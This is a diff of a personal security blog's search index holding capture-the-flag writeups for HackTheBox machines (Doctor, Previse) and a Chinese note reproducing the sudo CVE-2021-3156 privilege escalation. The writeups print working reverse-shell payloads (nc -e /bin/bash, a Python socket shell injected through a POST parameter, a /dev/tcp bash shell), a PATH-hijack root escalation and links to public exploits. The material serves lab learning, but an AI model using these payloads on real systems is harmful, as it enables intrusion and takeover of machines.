@@ -22,50 +22,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2021-3156复现</title>
-    <url>/2021/11/04/CVE-2021-3156%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="CVE-2021-3156简介"><a href="#CVE-2021-3156简介" class="headerlink" title="CVE-2021-3156简介"></a>CVE-2021-3156简介</h3><p>CVE-2021-3156全称Heap-Based Buffer Overflow In Sudo（Sudo堆缓存溢出），由Qualys研究团队发现</p>
-<p>Sudo命令允许非root用户以root用户权限执行命令，被广泛安装在BSD、Linux、MacOS、Cisco等系统中</p>
-<p>漏洞可使任意非root账户提升至root权限</p>
-<span id="more"></span>
-
-<h3 id="受影响版本："><a href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h3><p>Sudo 1.8.2 - 1.8.31p2</p>
-<p>Sudo 1.9.0 - 1.9.5p1</p>
-<h3 id="漏洞细节："><a href="#漏洞细节：" class="headerlink" title="漏洞细节："></a>漏洞细节：</h3><p>放链接因为我不会</p>
-<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p>
-<p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
-<p><a href="https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31">https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31</a></p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>国内文章的说法基本是执行</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">sudoedit</span> -s /</span><br></pre></td></tr></table></figure>
-
-<p>报错若以sudoedit字样开头则存在漏洞，usage开头则不存在</p>
-<h5 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h5><p><a href="https://github.com/reverse-ex/CVE-2021-3156.git">https://github.com/reverse-ex/CVE-2021-3156.git</a></p>
-<h5 id="Redhat系列系统检测工具"><a href="#Redhat系列系统检测工具" class="headerlink" title="Redhat系列系统检测工具"></a>Redhat系列系统检测工具</h5><p><a href="https://access.redhat.com/security/vulnerabilities/RHSB-2021-002">https://access.redhat.com/security/vulnerabilities/RHSB-2021-002</a></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
-<p><a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p>
-<h5 id="Debian-10"><a href="#Debian-10" class="headerlink" title="Debian 10"></a>Debian 10</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg" alt="image-20210326111341340"></a></p>
-<h5 id="Ubuntu-18-05"><a href="#Ubuntu-18-05" class="headerlink" title="Ubuntu 18.05"></a>Ubuntu 18.05</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg" alt="image-20210326111125332"></a></p>
-<h5 id="Ubuntu-20-04-1"><a href="#Ubuntu-20-04-1" class="headerlink" title="Ubuntu 20.04.1"></a>Ubuntu 20.04.1</h5><p>提权失败，猜想可能是更新是打了修复补丁</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg" alt="image-20210326111948355"></a></p>
-<p>换了payload，确实是</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg" alt="image-20210326135825834"></a></p>
-<h5 id="Centos-8"><a href="#Centos-8" class="headerlink" title="Centos 8"></a>Centos 8</h5><p>失败</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg" alt="image-20210326113909554"></a></p>
-<p>换了payload</p>
-<p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg" alt="image-20210326135636744"></a></p>
-<p>成功</p>
-<h5 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h5><p>成功</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg" alt="image-20210326140218835"></a></p>
-<h5 id="Parrot-Linux"><a href="#Parrot-Linux" class="headerlink" title="Parrot Linux"></a>Parrot Linux</h5><p>打过补丁</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg" alt="image-20210326140347869"></a></p>
-<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h5 id="升级sudo至最新版本"><a href="#升级sudo至最新版本" class="headerlink" title="升级sudo至最新版本"></a>升级sudo至最新版本</h5><p><a href="https://www.sudo.ws/download.html">https://www.sudo.ws/download.html</a></p>
-]]></content>
-      <tags>
-        <tag>Vulns</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA Study Notes-SQL Injection</title>
     <url>/2021/11/04/DVWA-Study-Notes-SQL-Injection/</url>
     <content><![CDATA[<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
@@ -170,6 +126,50 @@
 ]]></content>
       <tags>
         <tag>Pentest-Learning</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2021-3156复现</title>
+    <url>/2021/11/04/CVE-2021-3156%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="CVE-2021-3156简介"><a href="#CVE-2021-3156简介" class="headerlink" title="CVE-2021-3156简介"></a>CVE-2021-3156简介</h3><p>CVE-2021-3156全称Heap-Based Buffer Overflow In Sudo（Sudo堆缓存溢出），由Qualys研究团队发现</p>
+<p>Sudo命令允许非root用户以root用户权限执行命令，被广泛安装在BSD、Linux、MacOS、Cisco等系统中</p>
+<p>漏洞可使任意非root账户提升至root权限</p>
+<span id="more"></span>
+
+<h3 id="受影响版本："><a href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h3><p>Sudo 1.8.2 - 1.8.31p2</p>
+<p>Sudo 1.9.0 - 1.9.5p1</p>
+<h3 id="漏洞细节："><a href="#漏洞细节：" class="headerlink" title="漏洞细节："></a>漏洞细节：</h3><p>放链接因为我不会</p>
+<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p>
+<p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
+<p><a href="https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31">https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>国内文章的说法基本是执行</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">sudoedit</span> -s /</span><br></pre></td></tr></table></figure>
+
+<p>报错若以sudoedit字样开头则存在漏洞，usage开头则不存在</p>
+<h5 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h5><p><a href="https://github.com/reverse-ex/CVE-2021-3156.git">https://github.com/reverse-ex/CVE-2021-3156.git</a></p>
+<h5 id="Redhat系列系统检测工具"><a href="#Redhat系列系统检测工具" class="headerlink" title="Redhat系列系统检测工具"></a>Redhat系列系统检测工具</h5><p><a href="https://access.redhat.com/security/vulnerabilities/RHSB-2021-002">https://access.redhat.com/security/vulnerabilities/RHSB-2021-002</a></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
+<p><a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p>
+<h5 id="Debian-10"><a href="#Debian-10" class="headerlink" title="Debian 10"></a>Debian 10</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg" alt="image-20210326111341340"></a></p>
+<h5 id="Ubuntu-18-05"><a href="#Ubuntu-18-05" class="headerlink" title="Ubuntu 18.05"></a>Ubuntu 18.05</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg" alt="image-20210326111125332"></a></p>
+<h5 id="Ubuntu-20-04-1"><a href="#Ubuntu-20-04-1" class="headerlink" title="Ubuntu 20.04.1"></a>Ubuntu 20.04.1</h5><p>提权失败，猜想可能是更新是打了修复补丁</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg" alt="image-20210326111948355"></a></p>
+<p>换了payload，确实是</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg" alt="image-20210326135825834"></a></p>
+<h5 id="Centos-8"><a href="#Centos-8" class="headerlink" title="Centos 8"></a>Centos 8</h5><p>失败</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg" alt="image-20210326113909554"></a></p>
+<p>换了payload</p>
+<p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg" alt="image-20210326135636744"></a></p>
+<p>成功</p>
+<h5 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h5><p>成功</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg" alt="image-20210326140218835"></a></p>
+<h5 id="Parrot-Linux"><a href="#Parrot-Linux" class="headerlink" title="Parrot Linux"></a>Parrot Linux</h5><p>打过补丁</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg" alt="image-20210326140347869"></a></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h5 id="升级sudo至最新版本"><a href="#升级sudo至最新版本" class="headerlink" title="升级sudo至最新版本"></a>升级sudo至最新版本</h5><p><a href="https://www.sudo.ws/download.html">https://www.sudo.ws/download.html</a></p>
+]]></content>
+      <tags>
+        <tag>Vulns</tag>
       </tags>
   </entry>
   <entry>
@@ -307,6 +307,33 @@ sudo composer --working-dir=$TF run-script x
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox-Doctor</title>
+    <url>/2021/11/04/HackTheBox-Doctor/</url>
+    <content><![CDATA[<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210125110157665.png" alt="image-20210125110157665">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210125110157665.png)</p>
+<p>访问80、8089</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg" alt="image-20210125115723425"></a></p>
+<span id="more"></span>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg" alt="image-20210125114952150"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg" alt="image-20210125115009375"></a></p>
+<p>有一个splunk登陆点，但是使用默认口令admin:changeme登录失败</p>
+<p>添加hosts记录</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">10.129.89.77</span>	doctors.htb</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg" alt="image-20210125115145285"></a></p>
+<p>“医生安全消息”平台，注册登录</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg" alt="image-20210125115310662"></a></p>
+<p>URL中发现用户名，更改为admin尝试</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg" alt="image-20210125115342542"></a></p>
+<p>没有有价值的信息</p>
+<p>想到使用邮箱登录，尝试爆破<a href="mailto:info@doctors.htb">info@doctors.htb</a>账户</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">14.182</span><span class="regexp">/$(nc.traditional$IFS-e$IFS/</span>bin/bash<span class="variable">$IFS</span><span class="string">&#x27;10.10.14.182&#x27;</span><span class="variable">$IFS</span><span class="string">&#x27;9999&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HackTheBox-Beginner Track</title>
     <url>/2021/11/04/HackTheBox-Beginner-Track/</url>
     <content><![CDATA[<h1 id="BEGINNER-TRACK"><a href="#BEGINNER-TRACK" class="headerlink" title="BEGINNER TRACK"></a>BEGINNER TRACK</h1><p>共10题</p>
@@ -405,33 +432,6 @@ sudo composer --working-dir=$TF run-script x
 <p>powershell -enc 编码，本地监听，发送Notification，得到shell</p>
 <p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goex4iz3f4j311a0u0k0p.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goex4iz3f4j311a0u0k0p.jpg" alt="image-20210310170438014"></a></p>
 <p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goex3wr0adj30fs032aaa.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goex3wr0adj30fs032aaa.jpg" alt="image-20210310170402750"></a></p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox-Doctor</title>
-    <url>/2021/11/04/HackTheBox-Doctor/</url>
-    <content><![CDATA[<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210125110157665.png" alt="image-20210125110157665">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210125110157665.png)</p>
-<p>访问80、8089</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg" alt="image-20210125115723425"></a></p>
-<span id="more"></span>
-
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg" alt="image-20210125114952150"></a></p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg" alt="image-20210125115009375"></a></p>
-<p>有一个splunk登陆点，但是使用默认口令admin:changeme登录失败</p>
-<p>添加hosts记录</p>
-<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">10.129.89.77</span>	doctors.htb</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg" alt="image-20210125115145285"></a></p>
-<p>“医生安全消息”平台，注册登录</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg" alt="image-20210125115310662"></a></p>
-<p>URL中发现用户名，更改为admin尝试</p>
-<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg" alt="image-20210125115342542"></a></p>
-<p>没有有价值的信息</p>
-<p>想到使用邮箱登录，尝试爆破<a href="mailto:info@doctors.htb">info@doctors.htb</a>账户</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">14.182</span><span class="regexp">/$(nc.traditional$IFS-e$IFS/</span>bin/bash<span class="variable">$IFS</span><span class="string">&#x27;10.10.14.182&#x27;</span><span class="variable">$IFS</span><span class="string">&#x27;9999&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
@@ -667,14 +667,18 @@ sudo composer --working-dir=$TF run-script x
     <url>/2021/11/04/HackTheBox-Previse/</url>
     <content><![CDATA[<h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV <span class="number">10.129.95.185</span></span><br></pre></td></tr></table></figure>
 
-
-
+<p><img src="https://i.loli.net/2021/11/05/qi6VJyjOsg8TlRx.png" alt="nmap"></p>
 <p>Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.</p>
+<p><img src="https://i.loli.net/2021/11/05/TCld1m35kWUiYtn.png" alt="dirb"></p>
 <span id="more"></span>
 
+<p><img src="https://i.loli.net/2021/11/05/Afxp6R4OaLkHJIP.png" alt="website"></p>
 <h4 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h4><p>Noticed that there are many pages status code is 302 but nav.php is 200.</p>
+<p><img src="https://i.loli.net/2021/11/05/zCAobfEetwd4lGx.png" alt="nav"></p>
 <p>But every page needs to login, so I use BurpSuite to check these page want to find a footfold. Then I find account.php has a create account function, but it doesn’t check strictly user privilege. So I can create a POST request to create my own account.</p>
+<p><img src="https://i.loli.net/2021/11/05/THVJAgezdUnRom6.png" alt="account"></p>
 <p>Now I can login with my account, after look around every URL, I find a dangerous code area in source code logs.file which can be download in file.php</p>
+<p><img src="https://i.loli.net/2021/11/05/4NM7w6qUtuTAZas.png" alt="logs"></p>
 <p>There is a dangerous usage of exec that cause a RCE. Now I can modify the request package and execute my command.</p>
 <p>Listening on local 9999</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure>
@@ -683,10 +687,29 @@ sudo composer --working-dir=$TF run-script x
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /logs.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">9</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Origin</span>: http://<span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">94</span>.<span class="number">0</span>.<span class="number">4606</span>.<span class="number">81</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b<span class="number">3</span>;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">10.129.95.185</span>/file_logs.php</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=mf<span class="number">6</span>socg<span class="number">3</span>i<span class="number">7</span>adog<span class="number">9</span>i<span class="number">9</span>rj<span class="number">0</span>fn<span class="number">1</span>jbk</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">delim</span>=tab; /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.26&quot;</span>,<span class="number">9999</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>Now I get a shell of www-data, use MySQL user/pass in config.php to find some information in MySQL</p>
+<p><img src="https://i.loli.net/2021/11/05/L7Gc3lFtqPNIo4k.png" alt="mysql"></p>
 <p>Find a password cyphertext <code>$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.</code> </p>
 <p>I’m so confused at first why there is an emoji in cyphertext, but I find source code in accounts.php after.</p>
+<p><img src="https://i.loli.net/2021/11/05/16WY9ApsTM3lSRt.png" alt="account_cypher"></p>
 <p>I find cleartext after many tries, the cypher method calls MD5Cypher in hashcat mode 500</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$</span>🧂llol<span class="variable">$DQpmdvnb7EeuO6UaqRItf</span>.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/VvmMszEPnex3lZw.png" alt="cypher"></p>
 <p>Use this user/pass I connect the user m4lwhere via SSH</p>
+<h4 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h4><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/MdJC3mejhuoW6Pc.png" alt="sudo"></p>
+<p>Although I can not modify this script, I can change my enviroment varible, so I add my $home path to $PATH</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=/home/m4lwhere:$PATH</span><br><span class="line">echo <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>Then I create a fake program named gzip in home path, so that the script will execute it which have my own command init.</p>
+<p><img src="https://i.loli.net/2021/11/05/FlfqE4do3hCJIGu.png" alt="bash"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.14.3/</span><span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>And now what I need is listening and excute the script</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>scripts/access_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/05/dSsLq5lcPGHv1mk.png" alt="root"></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
